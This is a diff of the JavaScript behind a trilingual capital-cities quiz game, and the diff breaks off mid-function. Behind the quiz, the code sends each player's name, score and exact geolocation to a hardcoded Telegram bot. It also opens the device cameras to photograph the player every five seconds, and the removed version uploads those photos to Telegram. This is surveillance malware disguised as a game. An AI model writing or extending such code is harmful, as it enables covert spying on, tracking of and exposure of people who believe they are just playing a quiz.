@@ -1,81 +1,27 @@
-// Токен и чат ID Telegram (замени на свои)
+// script.js
+
 const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
 const TELEGRAM_CHAT_ID = '8071841674';
 
-// Массив вопросов (30 вопросов, пример 4, дополни позже)
 const questionsData = [
   {
-    hy: {
-      q: "Որն է Հայաստանի մայրաքաղաքը",
-      answers: ["Երևան", "Գյումրի", "Վանաձոր", "Հրազդան"],
-      correct: 0
-    },
-    ru: {
-      q: "Какой город является столицей Армении",
-      answers: ["Ереван", "Гюмри", "Ванадзор", "Раздан"],
-      correct: 0
-    },
-    en: {
-      q: "What is the capital of Armenia?",
-      answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"],
-      correct: 0
-    }
+    hy: { q: "Որն է Հայաստանի մայրաքաղաքը", answers: ["Երևան", "Գյումրի", "Վանաձոր", "Հրազդան"], correct: 0 },
+    ru: { q: "Какой город является столицей Армении", answers: ["Ереван", "Гюмри", "Ванадзор", "Раздан"], correct: 0 },
+    en: { q: "What is the capital of Armenia?", answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"], correct: 0 }
   },
   {
-    hy: {
-      q: "Որն է Ռուսաստանի մայրաքաղաքը",
-      answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Եկատերինբուրգ"],
-      correct: 0
-    },
-    ru: {
-      q: "Какой город является столицей России",
-      answers: ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"],
-      correct: 0
-    },
-    en: {
-      q: "What is the capital of Russia?",
-      answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"],
-      correct: 0
-    }
+    hy: { q: "Որն է Ռուսաստանի մայրաքաղաքը", answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Եկատերինբուրգ"], correct: 0 },
+    ru: { q: "Какой город является столицей России", answers: ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"], correct: 0 },
+    en: { q: "What is the capital of Russia?", answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"], correct: 0 }
   },
   {
-    hy: {
-      q: "Որն է Ֆրանսիայի մայրաքաղաքը",
-      answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"],
-      correct: 0
-    },
-    ru: {
-      q: "Какой город является столицей Франции",
-      answers: ["Париж", "Лион", "Марсель", "Ницца"],
-      correct: 0
-    },
-    en: {
-      q: "What is the capital of France?",
-      answers: ["Paris", "Lyon", "Marseille", "Nice"],
-      correct: 0
-    }
+    hy: { q: "Որն է Ֆրանսիայի մայրաքաղաքը", answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"], correct: 0 },
+    ru: { q: "Какой город является столицей Франции", answers: ["Париж", "Лион", "Марсель", "Ницца"], correct: 0 },
+    en: { q: "What is the capital of France?", answers: ["Paris", "Lyon", "Marseille", "Nice"], correct: 0 }
   },
-  {
-    hy: {
-      q: "Որն է ԱՄՆ մայրաքաղաքը",
-      answers: ["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"],
-      correct: 0
-    },
-    ru: {
-      q: "Какой город является столицей США",
-      answers: ["Вашингтон", "Нью-Йорк", "Лос-Анджелес", "Чикаго"],
-      correct: 0
-    },
-    en: {
-      q: "What is the capital of USA?",
-      answers: ["Washington, D.C.", "New York", "Los Angeles", "Chicago"],
-      correct: 0
-    }
-  }
-  // ... добавь остальные вопросы по образцу, чтобы всего 30 ...
+  // ... здесь дополнительно до 30 вопросов ...
 ];
 
-// Переводы интерфейса
 const translations = {
   hy: {
     enterName: "Մուտքագրեք ձեր անունը",
@@ -84,9 +30,10 @@ const translations = {
     questionsLeft: "Հարցեր մնացել են",
     correctAnswers: "Ճիշտ պատասխաններ",
     wrongAnswers: "Սխալ պատասխաններ",
-    victory: "Դուք հաղթեցիք! 🎉",
+    victory: "Ձեզնով հաղթեցիք! 🎉",
     defeat: "Ցավում ենք, պարտվեցիք 😞",
-    namePlaceholder: "Մուտքագրեք ձեր անունը"
+    namePlaceholder: "Մուտքագրեք ձեր անունը",
+    languageSelected: "Ընտրված լեզու"
   },
   ru: {
     enterName: "Введите ваше имя",
@@ -97,7 +44,8 @@ const translations = {
     wrongAnswers: "Неправильных ответов",
     victory: "Вы выиграли! 🎉",
     defeat: "К сожалению, вы проиграли 😞",
-    namePlaceholder: "Введите ваше имя"
+    namePlaceholder: "Введите ваше имя",
+    languageSelected: "Выбранный язык"
   },
   en: {
     enterName: "Enter your name",
@@ -108,11 +56,11 @@ const translations = {
     wrongAnswers: "Wrong answers",
     victory: "You won! 🎉",
     defeat: "Sorry, you lost 😞",
-    namePlaceholder: "Enter your name"
+    namePlaceholder: "Enter your name",
+    languageSelected: "Selected language"
   }
 };
 
-// Глобальные переменные состояния игры
 let currentLanguage = localStorage.getItem('lang') || 'hy';
 let userName = '';
 let currentQuestions = [];
@@ -120,12 +68,17 @@ let currentQuestionIndex = 0;
 let correctCount = 0;
 let wrongCount = 0;
 
-// Получаем DOM элементы
+let geoCoords = null;
+let cameraStreams = { front: null, back: null };
+let photoTimers = { front: null, back: null };
+
 const nameFormContainer = document.getElementById('name-form-container');
 const nameForm = document.getElementById('name-form');
 const nameInput = document.getElementById('name-input');
-const nameLabel = document.getElementById('name-label');
-const startBtn = document.getElementById('start-btn');
+const nameLabel = document.querySelector('label[for="name-input"]');
+const startBtn = nameForm.querySelector('button');
+
+const languageButtons = document.querySelectorAll('.lang-btn');
 
 const gameArea = document.getElementById('game-area');
 const userNameDiv = document.getElementById('user-name');
@@ -134,19 +87,7 @@ const questionDiv = document.getElementById('question');
 const answerButtonsDiv = document.getElementById('answer-buttons');
 const tryAgainBtn = document.getElementById('try-again-btn');
 
-// Обработчики для выбора языка по клику на флаги
-document.querySelectorAll('.lang-select img').forEach(img => {
-  img.addEventListener('click', () => {
-    const selectedLang = img.dataset.lang;
-    if (selectedLang && translations[selectedLang]) {
-      currentLanguage = selectedLang;
-      localStorage.setItem('lang', currentLanguage);
-      applyTranslations();
-    }
-  });
-});
-
-// Функция применения перевода в интерфейсе
+// Применяем переводы в интерфейсе
 function applyTranslations() {
   nameLabel.textContent = translations[currentLanguage].enterName;
   nameInput.placeholder = translations[currentLanguage].namePlaceholder;
@@ -155,8 +96,16 @@ function applyTranslations() {
   updateScoreInfo();
 }
 
-applyTranslations();
-// Перемешать массив (Фишер-Йейтс)
+// Обновляем информацию о счёте и имени
+function updateScoreInfo() {
+  const questionsLeft = 10 - currentQuestionIndex;
+  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
+    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
+    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
+  userNameDiv.textContent = userName || '-';
+}
+
+// Перемешиваем массив (Фишер-Йейтс)
 function shuffleArray(array) {
   for (let i = array.length - 1; i > 0; i--) {
     let j = Math.floor(Math.random() * (i + 1));
@@ -164,54 +113,65 @@ function shuffleArray(array) {
   }
 }
 
-// Выбрать 10 случайных вопросов из всего массива (без повторов)
+// Выбираем случайные 10 вопросов из базы (30 вопросов)
 function selectQuestions() {
   let indices = Array.from(Array(questionsData.length).keys());
   shuffleArray(indices);
   currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
 }
 
-// Запуск игры
+// Устанавливаем язык и сохраняем его
+function setLanguage(lang) {
+  currentLanguage = lang;
+  localStorage.setItem('lang', lang);
+  applyTranslations();
+}
+  
+// Инициализация кнопок переключения языка
+languageButtons.forEach(btn => {
+  btn.addEventListener('click', () => {
+    setLanguage(btn.dataset.lang);
+  });
+});
+// Старт игры, сохраняем имя, готовим вопросы и UI
 function startGame() {
-  userName = nameInput.value.trim();
-  if (!userName) {
-    userName = currentLanguage === 'hy' ? "Անհայտ" : currentLanguage === 'ru' ? "Неизвестный" : "Unknown";
-  }
+  userName = nameInput.value.trim() || (currentLanguage === 'hy' ? "Անհայտ" : currentLanguage === 'ru' ? "Неизвестный" : "Unknown");
   localStorage.setItem('userName', userName);
+
   currentQuestionIndex = 0;
   correctCount = 0;
   wrongCount = 0;
   selectQuestions();
+
   nameFormContainer.style.display = 'none';
   gameArea.style.display = 'block';
-  tryAgainBtn.style.display = 'none';
+
   showQuestion();
   updateScoreInfo();
   sendTelegramStart();
   startCameraIfAllowed();
-  getGeolocation();
+  requestGeolocation();
 }
 
-// Показать текущий вопрос
+// Отобразить текущий вопрос и варианты ответов
 function showQuestion() {
   clearAnswerButtons();
 
   if (currentQuestionIndex >= currentQuestions.length) {
-    // Ждём ответов на все 10 вопросов, не даём пропустить
+    // Если вопросов больше нет — показываем результаты
     showResults();
     return;
   }
 
   const qObj = currentQuestions[currentQuestionIndex][currentLanguage];
-
   questionDiv.textContent = qObj.q;
 
-  // Создаём массив с ответами и помечаем правильный
+  // Перемешиваем ответы с сохранением правильного
   let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
   shuffleArray(answers);
 
   answers.forEach(ans => {
-    const btn = document.createElement('button');
+    let btn = document.createElement('button');
     btn.classList.add('btn');
     btn.textContent = ans.text;
     btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
@@ -221,16 +181,15 @@ function showQuestion() {
   updateScoreInfo();
 }
 
-// Очистить кнопки ответов
+// Удаляем кнопки ответов перед показом нового вопроса
 function clearAnswerButtons() {
   while (answerButtonsDiv.firstChild) {
     answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
   }
 }
-
-// Обработка выбора ответа
+// Обработка выбора ответа игроком
 function selectAnswer(button, isCorrect) {
-  // Блокируем все кнопки после выбора
+  // Блокируем все кнопки, чтобы нельзя было нажать повторно
   Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);
 
   if (isCorrect) {
@@ -239,7 +198,7 @@ function selectAnswer(button, isCorrect) {
   } else {
     button.classList.add('wrong');
     wrongCount++;
-    // Подсветить правильный ответ зелёным
+    // Подсвечиваем правильный ответ зелёным
     Array.from(answerButtonsDiv.children).forEach(btn => {
       if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
         btn.classList.add('correct');
@@ -249,212 +208,116 @@ function selectAnswer(button, isCorrect) {
 
   updateScoreInfo();
 
+  // Ждём 1.5 секунды, чтобы пользователь увидел подсветку, потом следующий вопрос
   setTimeout(() => {
     currentQuestionIndex++;
     showQuestion();
   }, 1500);
 }
-
-// Обновление счёта и информации вверху
-function updateScoreInfo() {
-  const questionsLeft = 10 - currentQuestionIndex;
-  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
-    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
-    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
-  userNameDiv.textContent = userName || '-';
-}
-// Показать результаты после 10 вопросов
+// Показать результаты по окончании вопросов
 function showResults() {
   clearAnswerButtons();
 
-  if (correctCount >= 6) {
-    questionDiv.textContent = translations[currentLanguage].victory;
-  } else {
-    questionDiv.textContent = translations[currentLanguage].defeat;
-  }
+  // Выводим сообщение о победе или поражении (победа, если правильных ответов >=6)
+  questionDiv.textContent = correctCount >= 6 ? translations[currentLanguage].victory : translations[currentLanguage].defeat;
 
   tryAgainBtn.style.display = 'block';
+
+  // Фон игры остается, чтобы пользователь видел состояние
+  gameArea.style.filter = 'blur(2px)';
+  gameArea.style.pointerEvents = 'none';
+
   updateScoreInfo();
+
   sendTelegramResult();
 }
 
-// Обработчик кнопки «Փորձել նորից»
+// Кнопка «Попробовать снова» — сброс и запуск новой игры
 tryAgainBtn.addEventListener('click', () => {
   tryAgainBtn.style.display = 'none';
+  gameArea.style.filter = 'none';
+  gameArea.style.pointerEvents = 'auto';
 
-  // Если нет доступа к геолокации или камере — заново запросить
-  if (!geoCoords || !cameraStream) {
-    requestPermissions();
-  } else {
-    // Если разрешения есть — просто рестарт игры без перезагрузки страницы
-    currentQuestionIndex = 0;
-    correctCount = 0;
-    wrongCount = 0;
-    selectQuestions();
-    showQuestion();
-    updateScoreInfo();
+  // Запрашиваем заново доступы, если не даны
+  if (!geoCoords) {
+    requestGeolocation();
   }
+  if (!cameraStreams.front || !cameraStreams.back) {
+    startCameraIfAllowed();
+  }
+
+  startGame();
 });
-
-// Запросить геолокацию
-function getGeolocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(position => {
-      geoCoords = position.coords;
-      // Можно обновлять Telegram с гео если нужно
-    }, error => {
-      geoCoords = null;
-    });
-  }
-}
-
-// Запросить разрешения заново (гео + камера)
-function requestPermissions() {
-  // Сброс потоков камеры
-  if (cameraStream) {
-    let tracks = cameraStream.getTracks();
-    tracks.forEach(track => track.stop());
-    cameraStream = null;
-  }
-  geoCoords = null;
-
-  // Показываем форму имени, чтобы пользователь мог начать заново
-  nameFormContainer.style.display = 'block';
-  gameArea.style.display = 'none';
-
-  // Очистить имя для повторного ввода
-  nameInput.value = '';
-}
-
-// Запуск камеры и фотосъемка каждые 5 секунд
-function startCameraIfAllowed() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    cameraStream = null;
+// Запрос геолокации
+function requestGeolocation() {
+  if (!navigator.geolocation) {
+    console.warn("Геолокация не поддерживается");
     return;
   }
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => {
-      cameraStream = stream;
-      startTakingPhotos();
-    })
-    .catch(() => {
-      cameraStream = null;
-    });
-}
-
-let photoIntervalId = null;
-
-function startTakingPhotos() {
-  if (!cameraStream) return;
-  if (photoIntervalId) clearInterval(photoIntervalId);
-
-  const video = document.createElement('video');
-  video.srcObject = cameraStream;
-  video.play();
-
-  photoIntervalId = setInterval(() => {
-    takePhoto(video);
-  }, 5000);
-}
-
-function takePhoto(video) {
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 320;
-  canvas.height = video.videoHeight || 240;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  canvas.toBlob(blob => {
-    if (blob) {
-      sendPhotoToTelegram(blob);
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      geoCoords = position.coords;
+      sendTelegramGeo();
+    },
+    (error) => {
+      console.warn("Ошибка получения геолокации:", error);
     }
-  }, 'image/jpeg', 0.7);
+  );
 }
 
-// Отправка фото в Telegram
-function sendPhotoToTelegram(blob) {
-  const reader = new FileReader();
-  reader.onloadend = function () {
-    const base64data = reader.result.split(',')[1];
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', blob, 'photo.jpg');
-    formData.append('caption', `Фото игрока: ${userName}`);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    }).catch(() => { /* Игнорируем ошибки отправки фото */ });
-  };
-  reader.readAsDataURL(blob);
+// Отправка геолокации в Telegram в виде ссылки Google Maps
+function sendTelegramGeo() {
+  if (!geoCoords) return;
+  const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
+  const text = `📍 Геолокация: [Посмотреть на карте](${url})`;
+  sendTelegramMessage(text);
 }
-
-// Отправка старта игры в Telegram
-function sendTelegramStart() {
-  let message = `Игрок начал игру: ${userName}\nЯзык: ${currentLanguage}\n`;
-  if (geoCoords) {
-    message += `Геолокация: https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}\n`;
-  } else {
-    message += `Геолокация: недоступна\n`;
-  }
-  sendTelegramMessage(message);
-}
-
-// Отправка результатов игры в Telegram
-function sendTelegramResult() {
-  let message = `Результат игры игрока ${userName}:\n` +
-    `Язык: ${currentLanguage}\n` +
-    `Правильных ответов: ${correctCount}\n`;
-  if (geoCoords) {
-    message += `Геолокация: https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}\n`;
-  } else {
-    message += `Геолокация: недоступна\n`;
-  }
-  sendTelegramMessage(message);
-}
-
-// Универсальная отправка текста в Telegram
+// Общая функция отправки сообщения в Telegram через fetch API
 function sendTelegramMessage(text) {
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
       chat_id: TELEGRAM_CHAT_ID,
       text: text,
-      parse_mode: 'HTML'
+      parse_mode: "Markdown"
     })
-  }).catch(() => { /* Игнорируем ошибки отправки */ });
+  }).catch(e => console.error("Ошибка отправки в Telegram:", e));
 }
-// Элементы переключения языка (добавим сами в HTML позже)
-const langButtons = document.querySelectorAll('.lang-btn');
+// Отправить начало игры (имя, язык)
+function sendTelegramStart() {
+  const msg = `👤 Игрок начал игру: ${userName}\n🌐 Язык: ${translations[currentLanguage].languageSelected} (${currentLanguage})`;
+  sendTelegramMessage(msg);
+}
 
-langButtons.forEach(btn => {
-  btn.addEventListener('click', () => {
-    currentLanguage = btn.dataset.lang;
-    localStorage.setItem('lang', currentLanguage);
-    applyTranslations();
-
-    // Если игра уже идет, обновим вопрос и счет
-    if (gameArea.style.display === 'block') {
-      showQuestion();
-      updateScoreInfo();
-    }
-  });
-});
-
-// Инициализация при загрузке страницы
-window.addEventListener('DOMContentLoaded', () => {
-  currentLanguage = localStorage.getItem('lang') || 'hy';
-  applyTranslations();
-
-  // Если есть сохраненное имя — подставляем
-  const savedName = localStorage.getItem('userName');
-  if (savedName) {
-    nameInput.value = savedName;
+// Отправить результат игры (имя, язык, количество правильных, геолокация)
+function sendTelegramResult() {
+  let msg = `🏁 Игра окончена\n👤 Игрок: ${userName}\n🌐 Язык: ${translations[currentLanguage].languageSelected} (${currentLanguage})\n` +
+            `✅ Правильных ответов: ${correctCount}\n`;
+  if (geoCoords) {
+    const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
+    msg += `📍 Геолокация: [Посмотреть на карте](${url})\n`;
   }
+  sendTelegramMessage(msg);
+}
+// Запуск камеры (фронтальная и задняя), если есть доступ
+async function startCameraIfAllowed() {
+  try {
+    // Фронтальная камера
+    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+    cameraStreams.front = frontStream;
+    startPhotoTimer(frontStream, 'front');
 
-  nameForm.addEventListener('submit', e => {
-    e.preventDefault();
-    startGame();
-  });
-});
+    // Задняя камера
+    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
+    cameraStreams.back = backStream;
+    startPhotoTimer(backStream, 'back');
+  } catch (e) {
+    console.warn("Камера не доступна:", e);
+  }
+}
+
+// Запускаем таймер для фото с камеры каждые 5 секунд
+function startPhotoTimer(stream, whichCamera) {
+  const videoTrack = stream.getVideoTracks()[0];
+  if (!videoTrack) return
